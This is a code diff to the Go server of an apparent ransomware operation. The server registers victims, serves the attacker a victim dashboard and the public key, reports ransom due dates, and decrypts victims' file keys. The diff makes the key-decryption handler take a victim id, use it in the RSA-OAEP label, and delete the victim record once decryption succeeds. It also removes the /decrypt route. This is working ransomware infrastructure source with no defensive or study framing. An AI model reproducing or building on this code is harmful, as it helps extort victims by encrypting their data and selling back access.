@@ -26,13 +26,18 @@ var db *gorm.DB
 // DecryptKey takes a RSA encrypted key and then decrypts that key using the private key stored in
 // the server.
 func DecryptKey(w http.ResponseWriter, r *http.Request) {
+	query := r.URL.Query()
+	id, ok := query["id"]
+	if !ok || len(id) == 0 {
+		http.Error(w, "to encrypt key, you need to provide a valid id", http.StatusBadRequest)
+		return
+	}
+
 	key, err := ioutil.ReadAll(r.Body)
 	if err != nil {
 		http.Error(w, "error reading request body", http.StatusInternalServerError)
 		return
 	}
-
-	fmt.Println(key)
 
 	pemd, err := ioutil.ReadFile("private.pem")
 	if err != nil {
@@ -43,24 +48,37 @@ func DecryptKey(w http.ResponseWriter, r *http.Request) {
 	// decode the pem data
 	block, _ := pem.Decode(pemd)
 	if block == nil {
-		log.Fatalf("bad key data: %s", "not PEM-encoded")
+		http.Error(w, "error decoding key data", http.StatusInternalServerError)
+		return
 	}
 
 	// check that the key is of the right type.
-	if got, want := block.Type, "PRIVATE KEY"; got != want {
-		log.Fatalf("unknown key type %q, want %q", got, want)
+	if got, want := block.Type, "RSA PRIVATE KEY"; got != want {
+		http.Error(w, "unknow key type", http.StatusInternalServerError)
+		return
 	}
 
 	// Decode the RSA private key
 	priv, err := x509.ParsePKCS1PrivateKey(block.Bytes)
 	if err != nil {
-		log.Fatalf("bad private key: %s", err)
+		http.Error(w, "bad private key", http.StatusInternalServerError)
+		return
 	}
 
-	out, err := rsa.DecryptOAEP(sha256.New(), rand.Reader, priv, key, []byte("key.txt"))
+	out, err := rsa.DecryptOAEP(sha256.New(), rand.Reader, priv, key, []byte("key-"+id[0]))
 	if err != nil {
-		log.Fatalf("decrypt: %s", err)
+		http.Error(w, "error with rsa decrypting", http.StatusInternalServerError)
+		return
 	}
+
+	// since creating the decrypted key was successful we can delete the victim from the database
+	var victim Victim
+	if err := db.Where(&Victim{UUID: id[0]}).First(&victim).Error; err != nil {
+		http.Error(w, "invalid uuid", http.StatusBadRequest)
+		return
+	}
+
+	db.Delete(&victim)
 
 	w.Write(out)
 }
@@ -232,7 +250,6 @@ func main() {
 	http.HandleFunc("/pubkey", GetRSAPubKey)
 	http.HandleFunc("/register", RegisterNewVictim)
 	http.HandleFunc("/dashboard", ServeVictimsDisplay)
-	http.HandleFunc("/decrypt", DecryptKey)
 	http.HandleFunc("/due", GetRansomwareDueDate)
 
 	// start the http listener
